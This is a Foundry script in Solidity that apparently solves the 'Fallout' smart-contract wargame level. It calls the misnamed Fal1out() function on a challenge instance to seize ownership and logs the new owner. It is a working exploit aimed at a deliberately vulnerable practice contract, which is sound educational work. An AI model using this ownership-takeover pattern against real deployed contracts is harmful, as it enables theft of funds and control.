// SPDX-License-Identifier: MIT

pragma solidity ^0.6.2;

import { Script, console } from "forge-std/Script.sol";
import { Fallout } from "../src/02_Fallout.sol";

contract FalloutAttacker is Script {

  address payable challengeInstanceAddress = payable(0xECA0881C4976ceCdc0E9E6c147BD1CC6D5f42E73);
  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
  Fallout private challenge = Fallout(challengeInstanceAddress);

  function run() external {
    vm.startBroadcast(deployerPrivateKey);
    
    challenge.Fal1out();
    console.log("Owner: %s", challenge.owner());
    
    vm.stopBroadcast();
  }

}